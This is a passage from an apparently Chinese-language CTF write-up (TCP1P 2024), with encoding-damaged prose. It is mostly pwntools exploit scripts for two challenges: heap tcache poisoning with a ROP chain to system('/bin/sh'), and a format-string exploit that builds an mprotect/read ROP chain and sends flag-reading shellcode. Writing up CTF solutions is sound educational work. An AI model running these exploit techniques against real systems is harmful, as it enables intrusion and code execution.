class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;split&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">binary_path = <span class="string">&quot;./sim/chall&quot;</span></span><br><span class="line">libc_path = <span class="string">&quot;/home/NazrinDuck/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6&quot;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(binary_path)</span><br><span class="line"></span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">ip, port = <span class="string">&quot;ctf.tcp1p.team&quot;</span>, <span class="number">55551</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">    p = process(binary_path)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> p: gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(ip, port)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> _: <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ls = <span class="keyword">lambda</span> addr: log.success(<span class="built_in">hex</span>(addr))</span><br><span class="line">recv = <span class="keyword">lambda</span> char: u64(p.recvuntil(char, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\0&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># =================start=================#</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">idx, size, config</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;\n&quot;</span>, <span class="built_in">str</span>(<span class="number">0</span>).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;idx &gt;&gt; &quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;size &gt;&gt; &quot;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;config &gt;&gt; &quot;</span>, config)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;\n&quot;</span>, <span class="built_in">str</span>(<span class="number">1</span>).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;idx &gt;&gt; &quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">launch</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;\n&quot;</span>, <span class="built_in">str</span>(<span class="number">2</span>).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;idx &gt;&gt; &quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">terminate</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;\n&quot;</span>, <span class="built_in">str</span>(<span class="number">3</span>).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0</span>, <span class="number">0x78</span>, <span class="string">b&quot;&quot;</span>)</span><br><span class="line">launch(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">terminate()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;[*] Your Config: \n&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">heap_base = u64(p.recvn(<span class="number">8</span>)) &lt;&lt; <span class="number">12</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 12 0x1f3</span></span><br><span class="line">create(<span class="number">0</span>, <span class="number">0x78</span>, <span class="string">b&quot;&quot;</span>)</span><br><span class="line">create(<span class="number">1</span>, <span class="number">0x78</span>, <span class="string">b&quot;&quot;</span>)</span><br><span class="line">create(<span class="number">2</span>, <span class="number">0x78</span>, <span class="string">b&quot;&quot;</span>)</span><br><span class="line">create(<span class="number">3</span>, <span class="number">0x78</span>, <span class="string">b&quot;&quot;</span>)</span><br><span class="line">create(<span class="number">4</span>, <span class="number">0x78</span>, <span class="string">b&quot;&quot;</span>)</span><br><span class="line">create(<span class="number">5</span>, <span class="number">0x78</span>, <span class="string">b&quot;&quot;</span>)</span><br><span class="line">create(<span class="number">6</span>, <span class="number">0x78</span>, <span class="string">b&quot;&quot;</span>)</span><br><span class="line">create(<span class="number">7</span>, <span class="number">0x78</span>, <span class="string">b&quot;&quot;</span>)</span><br><span class="line">create(<span class="number">8</span>, <span class="number">0x78</span>, <span class="string">b&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">launch(<span class="number">7</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">terminate()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;[*] Your Config: \n&quot;</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0x000000000002a3e5: pop rdi; ret;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">main_arena = <span class="number">0x21ACE0</span></span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recvn(<span class="number">8</span>)) - main_arena</span><br><span class="line">stderr = libc.sym._IO_2_1_stderr_ + libc_base</span><br><span class="line">system = libc.sym.system + libc_base</span><br><span class="line">ptr = libc_base + <span class="number">0x21CA60</span></span><br><span class="line">environ = libc_base + libc.sym.environ</span><br><span class="line">pop_rdi = <span class="number">0x000000000002A3E5</span> + libc_base</span><br><span class="line">ret = <span class="number">0x00000000000F410B</span> + libc_base</span><br><span class="line"></span><br><span class="line">fake_wide_data_addr = heap_base + <span class="number">0x7E0</span></span><br><span class="line"></span><br><span class="line">_IO_wfile_overflow = <span class="number">0x217018</span> + libc_base</span><br><span class="line"></span><br><span class="line">binsh = libc_base + libc.search(<span class="string">b&quot;/bin/sh&quot;</span>).__next__()</span><br><span class="line"></span><br><span class="line">fake_io_1 = p64(<span class="number">0</span>) + p64(_IO_wfile_overflow)</span><br><span class="line">fake_io_1 = fake_io_1.ljust(<span class="number">0x50</span>, <span class="string">b&quot;\0&quot;</span>)</span><br><span class="line">fake_io_1 += <span class="string">b&quot;  sh;&quot;</span>.ljust(<span class="number">0x8</span>, <span class="string">b&quot;\0&quot;</span>)</span><br><span class="line"></span><br><span class="line">fake_io_2 = p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">fake_io_2 = fake_io_2.ljust(<span class="number">0x68</span>, <span class="string">b&quot;\0&quot;</span>)</span><br><span class="line">fake_io_2 += p64(fake_wide_data_addr)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0</span>, <span class="number">0x70</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">1</span>, <span class="number">0x70</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">2</span>, <span class="number">0x130</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">3</span>, <span class="number">0x70</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x10</span>)</span><br><span class="line">create(<span class="number">4</span>, <span class="number">0x70</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">launch(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">launch(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fake_vtable_addr = heap_base + 0x860</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># fake_wide_data = p64(0) * 2 + p64(fake_vtable_addr) + p64(system)</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">1</span>, <span class="number">0x70</span>, <span class="string">b&quot;&quot;</span>)</span><br><span class="line"><span class="comment"># create(3, 0x70, p64((stderr - 0x50) ^ (heap_base &gt;&gt; 12)))</span></span><br><span class="line">create(<span class="number">3</span>, <span class="number">0x70</span>, p64((environ - <span class="number">0x20</span>) ^ (heap_base &gt;&gt; <span class="number">12</span>)))</span><br><span class="line"></span><br><span class="line">create(<span class="number">5</span>, <span class="number">0x20</span>, <span class="string">b&quot;&quot;</span>)</span><br><span class="line">create(<span class="number">6</span>, <span class="number">0x10</span>, <span class="string">b&quot;env&quot;</span>)</span><br><span class="line"></span><br><span class="line">launch(<span class="number">6</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">terminate()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;[+] Terminate Protocol Success&quot;</span>)</span><br><span class="line">launch(<span class="number">6</span>)</span><br><span class="line">terminate()</span><br><span class="line">launch(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;[*] Your Config: \n&quot;</span>)</span><br><span class="line"><span class="comment"># p.recvn(8)</span></span><br><span class="line"></span><br><span class="line">p.recvn(<span class="number">32</span>)</span><br><span class="line">stack_addr = u64(p.recvn(<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">ret_addr = stack_addr - <span class="number">0x170</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">7</span>, <span class="number">0x10</span>, p64((ret_addr - <span class="number">0x8</span>) ^ (heap_base &gt;&gt; <span class="number">12</span>)))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">launch(<span class="number">5</span>)</span><br><span class="line">launch(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">3</span>, <span class="number">0x78</span>, <span class="string">b&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">ls(stack_addr)</span><br><span class="line">ls(heap_base)</span><br><span class="line">ls(libc_base)</span><br><span class="line"><span class="comment"># dbg(p)</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(system)</span><br><span class="line">create(<span class="number">0</span>, <span class="number">0x78</span>, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="amnesia"><a href="#amnesia" class="headerlink" title="amnesia"></a>amnesia</h1><hr>
<h2 id="æ¼æ´åˆ†æ-2"><a href="#æ¼æ´åˆ†æ-2" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>ä¿æŠ¤å…¨å¼€ï¼Œæœ‰æ²™ç®±ä½†åªç¦ç”¨äº†execveå’Œexecveat.è¯¥é¢˜åªpatch libcå’Œldè¿˜ä¸å¤Ÿï¼Œlibseccompç‰ˆæœ¬å’Œæœ¬æœºä¸å¯¹åº”ï¼Œåˆä»dockeré‡ŒæŠŠlibseccomp.soæŠ å‡ºæ¥patchçš„ï¼Œè¿™æ‰èƒ½åœ¨æœ¬æœºè¿è¡Œäº†</p>
<p>æœ¬é¢˜æœ‰ä¸¤ä¸ªå¤§å°ä¸ä¸€æ ·çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œå…¶ä¸­ç¬¬äºŒä¸ªå¯ä»¥æ— é™åˆ©ç”¨</p>
<p><img src="/images/2024TCP1P/amnesia1.png" alt="amnesia1"></p>
<p><img src="/images/2024TCP1P/amnesia2.png" alt="amnesia2"></p>
<p>æœ‰æ„æ€çš„æ˜¯ä½œè€…ç»™äº†ä¸€ä¸ªå‡½æ•°æ¥æ£€æŸ¥â€$pxâ€æ˜¯å¦å­˜åœ¨äºæˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²ä¸­ï¼Œè€Œä¸”è¿™ä¸ªå­—ç¬¦ä¸²â€œ$pxâ€å­˜å‚¨åœ¨bssæ®µè€Œä¸æ˜¯rodata,æ„å‘³ç€æˆ‘ä»¬èƒ½å¤Ÿæ›´æ”¹å®ƒã€‚ç¬¬ä¸€ä¸ªprintfçš„offsetä¸º14,ç¬¬äºŒä¸ªprintfçš„offsetä¸º8.</p>
<p>ç¬¬ä¸€æ¬¡åˆ©ç”¨è¯¥é™åˆ¶ä»…ä»…å¢å¤§äº†ä¸€ç‚¹receiveçš„å·¥ä½œé‡ã€‚æˆ‘ä»¬ç”¨è¿ç»­çš„â€œ%lu|â€æ³„æ¼å¹¶åœ¨è„šæœ¬ä¸­æ¥æ”¶è½¬æ¢ï¼Œå¯ä»¥æ‹¿åˆ°libcåŸºåœ°å€ï¼Œstackåœ°å€ï¼ˆrbpï¼‰å’Œç¨‹åºåŸºåœ°å€ï¼ˆret addræ‹¿åˆ°ï¼‰ã€‚</p>
<p>è¿™ä¸ªé™åˆ¶é€ æˆéº»çƒ¦çš„åªæœ‰â€˜$â€™å­—ç¬¦ï¼Œå› ä¸ºåœ¨ç¬¬äºŒä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸­ï¼Œæ²¡æœ‰â€˜$â€™ä¼šå¯¼è‡´æ— æ³•åœ¨32å­—ç¬¦çš„é•¿åº¦å†…æ„é€ å‡ºèƒ½å†™å…¥ä»»æ„å†…å®¹çš„payloadï¼ˆåªèƒ½ä»»æ„å†™å…¥æ•°å€¼10ï½19çš„qwordæˆ–æ•°å€¼10çš„dwordï¼‰ã€‚å› æ­¤æˆ‘ä»¬éœ€è¦åœ¨ç¬¬ä¸€æ¬¡åˆ©ç”¨æ—¶ä¿®æ”¹å­—ç¬¦ä¸²â€œ$pxâ€ä¸º0xaï¼ˆè¯¥å­—ç¬¦ä¸ä¼šè¢«scanfè¯»å–ï¼Œæ˜¯ç»å¯¹å®‰å…¨çš„ï¼‰</p>
<p>ä¹‹åå°±æ ¼å¼åŒ–å­—ç¬¦ä¸²å¸ƒç½®ROPå°±è¡Œäº†ã€‚32ä¸ªå­—ç¬¦è¿˜æ˜¯æ¯”è¾ƒè¶³å¤Ÿçš„ã€‚pwntoolsé‡Œçš„fmtstr_payloadç”Ÿæˆçš„payloadåªèƒ½å†™å…¥å•å­—èŠ‚ï¼ˆå…¶ä»–çš„éƒ½è¶…è¿‡32ä¸ªå­—ç¬¦äº†ï¼‰ï¼Œä¹Ÿå¯ä»¥è‡ªå·±å¸ƒç½®ä¸€æ¬¡æ€§å†™å…¥word.ROPé“¾çš„è®¾ç½®æ˜¯mprotect(bss_addr, 0x1000, 0x7) -&gt; read(0, bss_addr, 0x1000) -&gt; bss_addrï¼Œç„¶åæ•´ä¸€æ®µshellcodeå†™å…¥å³å¯ï¼ˆä¹Ÿå¯ä»¥ç”¨libcä¸­ç»™çš„åº“å‡½æ•°open,read,writeï¼‰</p>
<p>è¿œç¨‹ç¯å¢ƒä¸çŸ¥é“æœ‰å•¥é—®é¢˜ï¼Œæ¯ä¸€ä¸ªåœ°å€éƒ½æ²¡é—®é¢˜æ‰“äº†å¥½å‡ æ¬¡æ‰æ‰“é€š</p>
<p><img src="/images/2024TCP1P/amnesia3.png" alt="amnesia3"></p>
<h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;split&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">binary_path = <span class="string">&quot;./amnesia&quot;</span></span><br><span class="line">libc_path = <span class="string">&quot;./libc.so.6&quot;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(binary_path)</span><br><span class="line"></span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">ip, port = <span class="string">&quot;ctf.tcp1p.team&quot;</span>, <span class="number">20037</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">    p = process(binary_path)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> p: gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(ip, port)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> _: <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ls = <span class="keyword">lambda</span> addr: log.success(<span class="built_in">hex</span>(addr))</span><br><span class="line">recv = <span class="keyword">lambda</span> char: u64(p.recvuntil(char, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\0&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># =================start=================#</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># dbg(p)</span></span><br><span class="line">payload = <span class="string">b&quot;%lu|&quot;</span> * <span class="number">50</span></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;?\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.recvlines(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">14</span></span><br><span class="line"></span><br><span class="line">recv = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">47</span>):</span><br><span class="line">    recv.append(<span class="built_in">int</span>(p.recvuntil(<span class="string">b&quot;|&quot;</span>, drop=<span class="literal">True</span>)))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(i) + <span class="string">&quot;: &quot;</span> + <span class="built_in">hex</span>(recv[i]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x7eda00e00000 + 0x114887</span></span><br><span class="line">libc_base = recv[<span class="number">2</span>] - <span class="number">0x114887</span></span><br><span class="line">text_base = recv[<span class="number">40</span>] - <span class="number">0x16F7</span></span><br><span class="line">stack_addr = recv[<span class="number">39</span>]</span><br><span class="line"></span><br><span class="line">stack_addr2 = recv[<span class="number">42</span>]</span><br><span class="line">stack_addr3 = recv[<span class="number">43</span>]</span><br><span class="line"></span><br><span class="line">libc_stact_call_main = recv[<span class="number">46</span>]</span><br><span class="line">ret_addr = stack_addr - <span class="number">0x28</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> ret_addr == stack_addr2 - <span class="number">0x150</span></span><br><span class="line"><span class="keyword">assert</span> ret_addr == stack_addr3 - <span class="number">0x140</span></span><br><span class="line"><span class="keyword">assert</span> libc_base == libc_stact_call_main - <span class="number">0x29D90</span></span><br><span class="line"><span class="comment"># 41 ===&gt; ret_addr</span></span><br><span class="line"></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x000000000002A3E5</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x000000000002BE51</span></span><br><span class="line">pop_rdx_pop_r12 = libc_base + <span class="number">0x000000000011F2E7</span></span><br><span class="line">mprotect = libc_base + libc.sym.mprotect</span><br><span class="line">read = libc_base + libc.sym.read</span><br><span class="line"></span><br><span class="line">str_addr = text_base + <span class="number">0x4010</span></span><br><span class="line">bss_addr = text_base + <span class="number">0x4000</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># p.interactive()</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;%c%c%c%c&quot;</span> * <span class="number">2</span></span><br><span class="line"><span class="comment"># 21</span></span><br><span class="line"><span class="comment"># payload += (b&quot;%c%&quot; + str(0x29 - 19).encode() + b&quot;c%n&quot;).ljust(8, b&quot;\0&quot;)</span></span><br><span class="line">payload += <span class="string">b&quot;%c%c%n&quot;</span>.ljust(<span class="number">8</span>, <span class="string">b&quot;\0&quot;</span>)</span><br><span class="line">payload += p64(str_addr)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;ber?\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fmt</span>(<span class="params">addr, rop</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        tmp = rop &amp; <span class="number">0xFF</span></span><br><span class="line">        rop = rop &gt;&gt; <span class="number">8</span></span><br><span class="line"></span><br><span class="line">        payload = fmtstr_payload(<span class="number">8</span>, &#123;addr + i: tmp&#125;)</span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">len</span>(payload) &lt;= <span class="number">32</span></span><br><span class="line">        p.sendlineafter(<span class="string">b&quot;ber?\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fmt(ret_addr, pop_rdi)</span><br><span class="line">fmt(ret_addr + <span class="number">0x8</span>, bss_addr)</span><br><span class="line"></span><br><span class="line">fmt(ret_addr + <span class="number">0x10</span>, pop_rsi)</span><br><span class="line">fmt(ret_addr + <span class="number">0x18</span>, <span class="number">0x1000</span>)</span><br><span class="line"></span><br><span class="line">fmt(ret_addr + <span class="number">0x20</span>, pop_rdx_pop_r12)</span><br><span class="line">fmt(ret_addr + <span class="number">0x28</span>, <span class="number">0x7</span>)</span><br><span class="line"></span><br><span class="line">fmt(ret_addr + <span class="number">0x38</span>, mprotect)</span><br><span class="line"></span><br><span class="line">fmt(ret_addr + <span class="number">0x40</span>, pop_rdi)</span><br><span class="line">fmt(ret_addr + <span class="number">0x48</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">fmt(ret_addr + <span class="number">0x50</span>, pop_rsi)</span><br><span class="line">fmt(ret_addr + <span class="number">0x58</span>, bss_addr + <span class="number">0x400</span>)</span><br><span class="line"></span><br><span class="line">fmt(ret_addr + <span class="number">0x60</span>, pop_rdx_pop_r12)</span><br><span class="line">fmt(ret_addr + <span class="number">0x68</span>, <span class="number">0x200</span>)</span><br><span class="line"></span><br><span class="line">fmt(ret_addr + <span class="number">0x78</span>, read)</span><br><span class="line"></span><br><span class="line">fmt(ret_addr + <span class="number">0x80</span>, bss_addr + <span class="number">0x400</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;ber?\n&quot;</span>, <span class="string">b&quot;I remember everything!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mov rax, 2;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rcx, 0x7478742e67616c66;</span></span><br><span class="line"><span class="string">push 0;</span></span><br><span class="line"><span class="string">push rcx;</span></span><br><span class="line"><span class="string">mov rdi, rsp;</span></span><br><span class="line"><span class="string">push 0;</span></span><br><span class="line"><span class="string">xor rsi, rsi;</span></span><br><span class="line"><span class="string">xor rdx, rdx;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rsi, rax;</span></span><br><span class="line"><span class="string">xor rdi, rdi;</span></span><br><span class="line"><span class="string">inc rdi;</span></span><br><span class="line"><span class="string">inc rdi;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 0;</span></span><br><span class="line"><span class="string">mov rdx, rsp;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov r8, 0x50;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rax, 40;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">2.5</span>)</span><br><span class="line">p.sendafter(<span class="string">b&quot;Congratulations! You have recovered from your amnesia.&quot;</span>, asm(shellcode))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span 